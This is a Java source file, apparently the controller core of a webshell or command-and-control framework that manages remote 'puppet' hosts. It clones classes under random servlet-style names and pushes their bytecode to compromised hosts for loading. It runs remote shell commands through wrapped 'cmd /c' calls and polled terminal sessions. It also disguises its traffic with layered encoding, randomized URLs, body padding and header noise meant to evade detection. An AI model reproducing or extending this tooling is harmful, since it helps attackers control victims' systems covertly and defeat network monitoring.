package org.leo.core.puppet.service;

import org.leo.core.net.Communication;
import org.leo.core.net.impl.HttpCommunication;
import org.leo.core.net.layer.RequestLayer;
import org.leo.core.net.layer.ResponseLayer;
import org.leo.core.net.layer.PaddingStrategy;
import org.leo.core.net.layer.PaddingUtil;
import org.leo.core.net.layer.HeaderNoiseStrategy;
import org.leo.core.net.layer.HeaderNoiseGenerator;
import org.leo.core.net.layer.UrlGenerator;
import org.leo.core.net.layer.UrlStrategy;
import org.leo.core.util.asm.ClassFileMinimizer;
import org.leo.core.util.javassist.CloneWithJavassist;
import org.leo.core.util.request.ClassNameGenerator;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;

/**
 * pipeline 执行引擎（最终优化版）
 */
public class ComponentService {

    private static final Logger log = LoggerFactory.getLogger(ComponentService.class);

    private Communication communication;

    private List<RequestLayer> requestLayers = new ArrayList<>();
    private List<ResponseLayer> responseLayers = new ArrayList<>();

    protected String hostId;

    private int maxReqCount = 0;

    /** per-puppet URL 随机化策略 */
    private UrlStrategy urlStrategy;

    /** URL 生成器（懒初始化） */
    private volatile UrlGenerator urlGenerator;

    /** per-puppet 请求体 Padding 策略 */
    private PaddingStrategy paddingStrategy;

    /** per-puppet Header 噪声注入策略 */
    private HeaderNoiseStrategy headerNoiseStrategy;

    /** Header 噪声生成器（懒初始化） */
    private volatile HeaderNoiseGenerator headerNoiseGenerator;

    private Map<String, Set<String>> allLoadedComponent = new HashMap<>();

    /** pipeline 初始化标志 */
    private volatile boolean pipelineInitialized = false;

    // ================= 初始化 =================


//    public ComponentService(Communication communication) {
//        this.communication = communication;
//    }


    public String getHostId() {
        return hostId;
    }

    public void setHostId(String hostId) {
        this.hostId = hostId;
    }

    public ComponentService(Communication communication, List<RequestLayer> requestLayers, List<ResponseLayer> responseLayers) {
        this.communication = communication;
        this.requestLayers = requestLayers;
        this.responseLayers = responseLayers;
    }


    public void setRequestLayers(List<RequestLayer> requestLayers) {
        this.requestLayers = requestLayers;
        this.pipelineInitialized = false;
    }

    public void setResponseLayers(List<ResponseLayer> responseLayers) {
        this.responseLayers = responseLayers;
        this.pipelineInitialized = false;
    }

    public void setUrlStrategy(UrlStrategy urlStrategy) {
        this.urlStrategy = urlStrategy;
        // 重建 UrlGenerator
        if (urlStrategy != null && communication instanceof HttpCommunication) {
            this.urlGenerator = new UrlGenerator(urlStrategy, ((HttpCommunication) communication).getUrl());
        } else {
            this.urlGenerator = null;
        }
    }

    public UrlStrategy getUrlStrategy() {
        return urlStrategy;
    }

    public void setPaddingStrategy(PaddingStrategy paddingStrategy) {
        this.paddingStrategy = paddingStrategy;
    }

    public PaddingStrategy getPaddingStrategy() {
        return paddingStrategy;
    }

    public void setMaxReqCount(int maxReqCount) {
        this.maxReqCount = maxReqCount;
    }

    public int getMaxReqCount() {
        return maxReqCount;
    }

    public void setHeaderNoiseStrategy(HeaderNoiseStrategy headerNoiseStrategy) {
        this.headerNoiseStrategy = headerNoiseStrategy;
        if (headerNoiseStrategy != null && headerNoiseStrategy.isEnabled()) {
            this.headerNoiseGenerator = new HeaderNoiseGenerator(headerNoiseStrategy);
        } else {
            this.headerNoiseGenerator = null;
        }
    }

    public HeaderNoiseStrategy getHeaderNoiseStrategy() {
        return headerNoiseStrategy;
    }

    private synchronized void initPipeline() throws Exception {
        if (pipelineInitialized) {
            return;
        }

        for (RequestLayer layer : requestLayers) {
            if (layer.getDisguise() != null) {
                layer.getDisguise().init();
            }
        }

        for (ResponseLayer layer : responseLayers) {
            if (layer.getDisguise() != null) {
                layer.getDisguise().init();
            }
        }

        pipelineInitialized = true;
    }

    private Set<String> getComponentsSet(String hostId) {
        return allLoadedComponent.computeIfAbsent(hostId, k -> new HashSet<>());
    }

    /**
     * 获取指定 hostId 的已加载组件集合（供外部查询）
     */
    public Set<String> getLoadedComponentNames(String hostId) {
        Set<String> set = allLoadedComponent.get(hostId);
        return set != null ? Collections.unmodifiableSet(set) : Collections.<String>emptySet();
    }

    /**
     * 将 puppet 端报告的已加载组件名预填到本 Service 的缓存中，
     * 避免服务端重启后重复加载。
     */
    public void seedLoadedComponents(String hostId, Set<String> componentNames) {
        if (hostId == null || componentNames == null) return;
        getComponentsSet(hostId).addAll(componentNames);
    }

    // ================= 业务 =================

    public Map<String, Object> invokeComponent(String componentName, Map<String, Object> params) throws Exception {
        initPipeline();

        synchronized (this) {
            if (!getComponentsSet(hostId).contains(componentName)) {
                Map<String, Object> loadResult = loadComponent(componentName);
                // 若 M=2 加载失败，立即返回错误，不继续执行 M=3
                if (loadResult == null) {
                    Map<String, Object> err = new HashMap<>();
                    err.put("code", Integer.valueOf(500));
                    err.put("msg", "组件加载失败: " + componentName + "（返回为空）");
                    return err;
                }
                Object codeObj = loadResult.get("code");
                boolean loaded = codeObj instanceof Number && ((Number) codeObj).intValue() == 200;
                if (!loaded) {
                    // 把 M=2 的实际错误原封不动地返回给调用方
                    return loadResult;
                }
            }
        }

        params.put("M", 3);
        params.put("componentName", componentName);

        return run(params);
    }

    /**
     * 子类便捷调用:把 action + 参数 KV 序列封装成 invokeComponent 调用。
     * 用法:{@code call("ComponentX", "list", "key1", v1, "key2", v2)}。
     * 仅支持非 null 值;null 值会被跳过(语义同 if-not-null put)。
     * kvs 长度必须为偶数。
     */
    protected Map<String, Object> call(String componentName, String action, Object... kvs) throws Exception {
        if (kvs != null && (kvs.length & 1) != 0) {
            throw new IllegalArgumentException("call(...) kvs 必须为偶数(key,value 成对)");
        }
        Map<String, Object> params = new HashMap<>();
        params.put("action", action);
        if (kvs != null) {
            for (int i = 0; i < kvs.length; i += 2) {
                Object key = kvs[i];
                Object value = kvs[i + 1];
                if (value != null && key != null) {
                    params.put(key.toString(), value);
                }
            }
        }
        return invokeComponent(componentName, params);
    }

    public synchronized Map<String, Object> loadComponent(String componentName) throws Exception {
        Map<String, Object> results = new HashMap<>();


        String newClassName = ClassNameGenerator.generateServletStyleClassName();
        byte[] bytecode = CloneWithJavassist.cloneClass(componentName, newClassName);

        if (bytecode == null) {
            results.put("code", 500);
            results.put("msg", "无法获取组件字节码");
            return results;
        }

        bytecode = new ClassFileMinimizer().transform(bytecode);

        Map<String, Object> params = new HashMap<>();
        params.put("M", 2);
        params.put("componentName", componentName);
        params.put("bytecode", bytecode);

        results = run(params);

        if (results != null && Integer.valueOf(200).equals(results.get("code"))) {
            getComponentsSet(hostId).add(componentName);
            results.put("msg", "插件加载成功");
        }

        return results;
    }

    // ================= 核心执行 =================

    protected Map<String, Object> run(Map<String, Object> payload) {
        Map<String, Object> reqPayload = new HashMap<>(payload);
        reqPayload.put("hostId", hostId);

        // 请求体 Padding：在 Map 层注入随机字段，encode 时一起加密
        PaddingUtil.pad(reqPayload, paddingStrategy);

        if (communication instanceof HttpCommunication && !requestLayers.isEmpty()) {
            applyHeaders((HttpCommunication) communication);
        }

        int attempt = 0;
        Map<String, Object> result;

        while (true) {
            try {
                // URL 随机化：每次请求生成不同的 URL
                if (urlGenerator != null && communication instanceof HttpCommunication) {
                    String nextUrl = urlGenerator.nextUrl();
                    ((HttpCommunication) communication).setRequestUrl(nextUrl);
                }

                // Header 噪声注入：每次请求附加随机 Header
                if (headerNoiseGenerator != null && communication instanceof HttpCommunication) {
                    java.util.Map<String, String> noiseHeaders = headerNoiseGenerator.generate();
                    ((HttpCommunication) communication).setRequestNoiseHeaders(noiseHeaders);
                }

                byte[] encoded = encode(reqPayload);
                byte[] resp = communication.sendRequest(encoded);
                result = decode(resp);

                if ("success".equals(result.get("reqStatus"))) {
                    result.remove("reqStatus");
                    return result;
                }
            } catch (Exception e) {
                result = new HashMap<>();
                result.put("reqStatus", "fail");
                // e.getMessage() 对 NPE 等是 null，用类名兜底
                String msg = e.getMessage();
                result.put("reqMsg", msg != null ? msg : e.getClass().getName() + " (no message)");
                log.warn("[ComponentService] run 异常 M={} component={} attempt={}: {} - {}",
                        payload.get("M"),
                        payload.get("componentName"),
                        attempt + 1,
                        e.getClass().getName(),
                        msg, e);
            }

            if (++attempt >= maxReqCount) {
                String errMsg = (String) result.get("reqMsg");
                result.remove("reqStatus");
                result.remove("reqMsg");
                // 通信失败时 result 为空 map，补充明确的错误信息
                if (!result.containsKey("code")) {
                    result.put("code", Integer.valueOf(500));
                    String finalMsg = errMsg != null ? errMsg : "通信失败，请检查 Puppet 连接";
                    result.put("msg", finalMsg);
                    log.error("[ComponentService] 所有重试耗尽 component={} M={} errMsg={}",
                            payload.get("componentName"), payload.get("M"), finalMsg);
                }
                return result;
            }
        }
    }

    // ================= encode =================

    private byte[] encode(Map<String, Object> params) throws Exception {
        if (requestLayers == null || requestLayers.isEmpty()) {
            throw new IllegalStateException("requestLayers 为空，无法编码请求（puppet 未配置 reqDisguiseId？）");
        }

        byte[] temp = requestLayers.get(0)
                .getDisguise()
                .encode(params);

        for (int i = 1; i < requestLayers.size(); i++) {
            RequestLayer layer = requestLayers.get(i);
            RequestLayer beforeLayer = requestLayers.get(i-1);
            Map<String, String> header = beforeLayer.getHeaders();
            if (header == null) {
               header = new HashMap<String, String>();
            }
            Map<String, Object> payload = new HashMap<>();
            payload.put("M", 1);
            payload.put("rUrl", beforeLayer.getRUrl());
            payload.put("headers", header);
            payload.put("body", temp);

            temp = layer.getDisguise().encode(payload);
        }


        return temp;
    }

    // ================= decode =================

    private Map<String, Object> decode(byte[] data) {
        Map<String, Object> result = new HashMap<>();

        try {
            byte[] temp = data;
            Map<String, Object> map = null;

            for (int i = 0; i < responseLayers.size(); i++) {
                map = responseLayers.get(i).getDisguise().decode(temp);

                if (i == responseLayers.size() - 1) {
                    result = map;
                } else {
                    temp = (byte[]) map.get("respData");
                }
            }

            // result 可能为 null（Disguise.decode 返回 null）
            if (result == null) {
                log.warn("[ComponentService] decode: Disguise 返回 null，data.length={}",
                        data == null ? -1 : data.length);
                result = new HashMap<>();
                result.put("reqStatus", "fail");
                result.put("reqMsg", "Disguise.decode 返回 null");
                return result;
            }

            // result 为空 map 说明响应解析异常
            if (result.isEmpty()) {
                log.warn("[ComponentService] decode: 解码结果为空 map，data.length={}",
                        data == null ? -1 : data.length);
                result.put("reqStatus", "fail");
                result.put("reqMsg", "响应解码结果为空（Puppet 可能未发送响应体）");
            } else {
                result.put("reqStatus", "success");
            }

        } catch (Exception e) {
            // 注意：此处 result 可能已被赋值为 null（来自上面的 result = map），
            // 直接 result.clear() 会再次 NPE 并逃出 catch，必须先重建。
            result = new HashMap<>();
            result.put("reqStatus", "fail");
            String msg = e.getMessage();
            String reqMsg = msg != null ? msg : e.getClass().getName() + " (no message)";
            result.put("reqMsg", reqMsg);
            log.warn("[ComponentService] decode 异常: {} data.length={}",
                    reqMsg, data == null ? -1 : data.length, e);
        }

        return result;
    }

    // ================= headers 核心逻辑 =================

    private void applyHeaders(HttpCommunication http) {
        if (requestLayers == null || requestLayers.isEmpty()) {
            return;
        }

        RequestLayer outermost = requestLayers.get(requestLayers.size() - 1);

        // 最终要写入 HTTP 的 headers
        Map<String, String> headerMap = new LinkedHashMap<>();

        // 用于大小写不敏感合并，key: 小写，value: 原始写法
        Map<String, String> keyLowerMap = new HashMap<>();

        // 先添加 Disguise 默认 headers
        if (outermost.getDisguise() != null && outermost.getDisguise().getHeaders() != null) {
            Map<? extends String, ? extends String> disguiseHeaders = outermost.getDisguise().getHeaders();

            for (Map.Entry<? extends String, ? extends String> entry : disguiseHeaders.entrySet()) {
                String origKey = entry.getKey();
                String lowerKey = origKey.toLowerCase();
                if (!keyLowerMap.containsKey(lowerKey)) {
                    keyLowerMap.put(lowerKey, origKey);
                    headerMap.put(origKey, entry.getValue());
                }
            }
        }

        //再添加 RequestLayer 自定义 headers（覆盖默认 headers）
        if (outermost.getHeaders() != null) {
            Map<? extends String, ? extends String> customHeaders = outermost.getHeaders();
            for (Map.Entry<? extends String, ? extends String> entry : customHeaders.entrySet()) {
                String lowerKey = entry.getKey().toLowerCase();
                String origKey = keyLowerMap.getOrDefault(lowerKey, entry.getKey());
                keyLowerMap.put(lowerKey, origKey);
                headerMap.put(origKey, entry.getValue());
            }
        }

        // 写入 HttpCommunication
        for (Map.Entry<String, String> entry : headerMap.entrySet()) {
            http.addHeader(entry.getKey(), entry.getValue());
        }
    }

    // ================= 服务端 exec 辅助（子类直接调用）=================

    /**
     * 将命令包装为 Windows cmd /c 形式，并强制 UTF-8 代码页。
     * Linux/macOS 子类在 OS 检测后直接传入原始命令，无需调用此方法。
     */
    protected String winCmd(String cmd) {
        return "cmd /c \"chcp 65001 > nul & " + cmd + "\"";
    }

    /**
     * 快速同步执行，适合确定在 2s 内完成的命令（reg query、netsh、nmcli 等）。
     * 无超时保护，子类需确保命令一定会快速退出。
     */
    protected String execFast(String cmd) throws Exception {
        Map<String, Object> params = new HashMap<>();
        params.put("cmd", cmd.getBytes("UTF-8"));
        Map<String, Object> result = invokeComponent("ExecCommandSimpleComponent", params);
        return extractString(result);
    }

    /**
     * 带超时的同步执行（哨兵模式）。
     * 在 puppet 侧开启 shell 会话，写入命令 + 哨兵，等待哨兵出现或超时。
     *
     * @param cmd            要执行的命令
     * @param timeoutSeconds 超时秒数（1~120）
     * @return 命令输出（已去除哨兵行，超时时追加 WARN 行）
     */
    protected String execWithTimeout(String cmd, int timeoutSeconds) throws Exception {
        int clampedTimeout = Math.max(1, Math.min(timeoutSeconds, 120));

        // ── 1. 创建 shell 会话，等待就绪 ──
        String processId = java.util.UUID.randomUUID().toString();
        sendToTerminal("\n", processId);

        long readyDeadline = System.currentTimeMillis() + 5000;
        while (System.currentTimeMillis() < readyDeadline) {
            Thread.sleep(300);
            try {
                String probe = readFromTerminal(processId);
                if (probe != null && !probe.isEmpty()) break;
            } catch (Exception ignored) {}
        }

        // ── 2. 写入命令 + 哨兵 ──
        String sentinel = "__DONE_" + processId.replace("-", "").substring(0, 12) + "__";
        sendToTerminal(cmd + "\n", processId);
        sendToTerminal("echo " + sentinel + "\n", processId);

        // ── 3. 轮询直到哨兵或超时 ──
        long deadline = System.currentTimeMillis() + (long) clampedTimeout * 1000;
        StringBuilder accumulated = new StringBuilder();
        boolean sentinelFound = false;
        while (System.currentTimeMillis() < deadline) {
            Thread.sleep(400);
            String chunk = readFromTerminal(processId);
            if (chunk != null && !chunk.isEmpty()) {
                accumulated.append(chunk);
                if (accumulated.indexOf(sentinel) >= 0) {
                    sentinelFound = true;
                    break;
                }
            }
        }

        // ── 4. 停止会话 ──
        try {
            Map<String, Object> stopParams = new HashMap<>();
            stopParams.put("processId", processId.getBytes("UTF-8"));
            stopParams.put("op", Integer.valueOf(2));
            invokeComponent("ExecCommandComponent", stopParams);
        } catch (Exception ignored) {}

        // ── 5. 去除哨兵行及其后内容，修剪尾部空行 ──
        String result = accumulated.toString();
        int idx = result.indexOf(sentinel);
        if (idx >= 0) result = result.substring(0, idx);
        int end = result.length();
        while (end > 0 && (result.charAt(end - 1) == '\n' || result.charAt(end - 1) == '\r')) end--;
        result = result.substring(0, end);

        if (!sentinelFound) {
            result += "\n[WARN: command timed out after " + clampedTimeout + "s, output may be incomplete]";
        }
        return result;
    }

    private void sendToTerminal(String text, String processId) throws Exception {
        Map<String, Object> p = new HashMap<>();
        p.put("processId", processId.getBytes("UTF-8"));
        p.put("op", Integer.valueOf(0));
        p.put("cmd", text.getBytes("UTF-8"));
        invokeComponent("ExecCommandComponent", p);
    }

    private String readFromTerminal(String processId) throws Exception {
        Map<String, Object> p = new HashMap<>();
        p.put("processId", processId.getBytes("UTF-8"));
        p.put("op", Integer.valueOf(1));
        Map<String, Object> result = invokeComponent("ExecCommandComponent", p);
        return extractString(result);
    }

    /**
     * 从 invokeComponent 结果中提取字符串输出。
     * 兼容 data(byte[])、data(String)、output(String) 三种格式。
     */
    protected String extractString(Map<String, Object> results) {
        if (results == null) return "";
        Object data = results.get("data");
        if (data instanceof byte[]) {
            try { return new String((byte[]) data, "UTF-8"); } catch (Exception e) { return ""; }
        }
        if (data instanceof String) return (String) data;
        Object output = results.get("output");
        if (output instanceof String) return (String) output;
        return "";
    }
}
